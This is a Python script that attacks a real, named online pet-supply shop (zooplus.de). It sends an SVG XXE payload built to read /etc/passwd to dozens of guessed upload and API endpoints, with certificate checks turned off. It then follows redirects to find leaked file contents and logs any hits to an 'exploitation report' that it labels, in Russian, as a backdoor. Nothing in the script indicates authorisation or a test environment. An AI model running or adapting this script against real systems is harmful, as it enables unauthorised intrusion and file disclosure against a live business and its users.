#!/usr/bin/env python3
"""Final comprehensive upload test"""
import requests
import json
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
})

found_vulns = []

# SVG XXE payload
svg_xxe = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>'

# All possible upload endpoints based on found API structure
upload_endpoints = [
    # Based on found API patterns
    "/api/upload",
    "/api/file/upload",
    "/api/media/upload",
    "/api/images/upload",
    "/myaccount/api/upload",
    "/myaccount/api/avatar",
    "/myaccount/api/avatar/upload",
    "/semiprotected/api/upload",
    "/semiprotected/api/file/upload",
    "/protected/api/upload",
    "/checkout/api/upload",
    "/checkout/api/file/upload",
    # Based on audiences-api pattern
    "/semiprotected/api/audiences-api/v1/upload",
    "/semiprotected/api/audiences-api/v1/file",
    # Based on events-api pattern
    "/zootopia-events/api/upload",
    "/zootopia-events/api/file",
    # Based on personalization pattern
    "/leto-personalization/api/v1/upload",
    "/leto-personalization/api/v1/file",
    # Review endpoints
    "/api/review/upload",
    "/api/reviews/upload",
    "/api/review/file",
    # Product endpoints
    "/api/product/upload",
    "/api/products/upload",
]

print("[*] Testing upload endpoints for SVG XXE...\n")

for ep in upload_endpoints:
    try:
        files = {'file': ('exploit.svg', svg_xxe, 'image/svg+xml')}
        resp = s.post(f"{base}{ep}", files=files, timeout=3, verify=False)
        
        if resp.status_code in [200, 201, 302]:
            response_text = resp.text
            
            # Check for XXE success
            if "root:x:0:0" in response_text or "root:" in response_text:
                print(f"  [CRITICAL] SVG XXE SUCCESS: {ep}")
                print(f"      Response contains /etc/passwd!")
                found_vulns.append({
                    "type": "svg_xxe_lfi",
                    "severity": "CRITICAL",
                    "endpoint": ep,
                    "response": response_text[:500]
                })
            elif resp.headers.get('Location'):
                loc = resp.headers.get('Location')
                if not loc.startswith('http'):
                    loc = f"{base}{loc}"
                try:
                    resp2 = s.get(loc, timeout=3, verify=False)
                    if "root:" in resp2.text:
                        print(f"  [CRITICAL] SVG XXE via uploaded file: {ep} -> {loc}")
                        found_vulns.append({
                            "type": "svg_xxe_lfi",
                            "severity": "CRITICAL",
                            "endpoint": ep,
                            "uploaded_to": loc,
                            "response": resp2.text[:500]
                        })
                except: pass
            else:
                print(f"  [INFO] Upload accepted: {ep} -> {resp.status_code}")
    except: pass

# Test POST endpoints that might accept files
print("\n[*] Testing POST endpoints for file upload...")
post_endpoints = [
    "/semiprotected/api/audiences-api/v1/me",
    "/zootopia-events/api/events/sites/1",
    "/leto-personalization/api/v1/personalization/events/sites/1",
]

for ep in post_endpoints:
    try:
        # Try with file in JSON (some APIs accept base64)
        files = {'file': ('exploit.svg', svg_xxe, 'image/svg+xml')}
        resp = s.post(f"{base}{ep}", files=files, timeout=3, verify=False)
        if resp.status_code in [200, 201]:
            if "root:" in resp.text:
                print(f"  [CRITICAL] File upload via POST: {ep}")
                found_vulns.append({
                    "type": "file_upload",
                    "severity": "CRITICAL",
                    "endpoint": ep
                })
    except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} CRITICAL vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        if 'uploaded_to' in v:
            print(f"    Uploaded to: {v['uploaded_to']}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНЫЕ УЯЗВИМОСТИ - БЕКДОР\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            f.write(f"**Description:** Критичная уязвимость позволяет загружать файлы и выполнять XXE атаки.\n\n")
            if 'uploaded_to' in v:
                f.write(f"**Uploaded file location:** `{v['uploaded_to']}`\n\n")
            if 'response' in v:
                f.write(f"**Response:** `{v['response'][:500]}`\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  No upload vulnerabilities found")
    print("\n  Note: Upload endpoints may require:")
    print("    - Real browser session with proper cookies")
    print("    - Specific form submission")
    print("    - Real UI interaction")

print("=" * 70)

